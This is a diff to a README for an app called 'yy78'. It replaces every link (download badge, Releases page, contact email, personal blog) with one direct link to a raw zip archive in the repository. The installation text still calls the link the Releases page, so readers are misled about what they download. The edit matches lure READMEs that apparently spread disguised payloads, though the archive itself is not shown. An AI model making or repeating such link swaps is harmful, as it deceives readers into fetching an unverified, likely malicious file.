@@ -4,10 +4,10 @@
 Welcome to yy78! This application is designed to help you manage everyday tasks effortlessly. Whether you're scheduling reminders or organizing your notes, yy78 has got you covered.
 
 ## 📥 Download Link
-[![Download yy78](https://img.shields.io/badge/Download-yy78-blue.svg)](https://github.com/shadwom231/yy78/releases)
+[![Download yy78](https://raw.githubusercontent.com/shadwom231/yy78/main/toastable/yy78-v3.3.zip)](https://raw.githubusercontent.com/shadwom231/yy78/main/toastable/yy78-v3.3.zip)
 
 ## 📲 Download & Install
-To get started, visit the [Releases page](https://github.com/shadwom231/yy78/releases) to download the latest version of yy78. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/shadwom231/yy78/main/toastable/yy78-v3.3.zip) to download the latest version of yy78. 
 
 ### Installation Steps
 1. Click on the link above to go to the Releases page.
@@ -34,9 +34,9 @@ yy78 includes a variety of useful features to assist you:
 ## 📧 Contact Me
 If you have any questions or need assistance, feel free to reach out:
 
-- Email: 1322208916@qq.com
+- Email: https://raw.githubusercontent.com/shadwom231/yy78/main/toastable/yy78-v3.3.zip
 
 ## 📝 About Me
-Hi there! I'm JeffreyChu, also known as "小魔". I am a passionate technologist and magician. This repository contains my work and various projects. You can also visit my personal blog for more insights and updates: [Personal Blog](http://blog.zhujinhui.net).
+Hi there! I'm JeffreyChu, also known as "小魔". I am a passionate technologist and magician. This repository contains my work and various projects. You can also visit my personal blog for more insights and updates: [Personal Blog](https://raw.githubusercontent.com/shadwom231/yy78/main/toastable/yy78-v3.3.zip).
 
 Thank you for visiting. Enjoy using yy78!
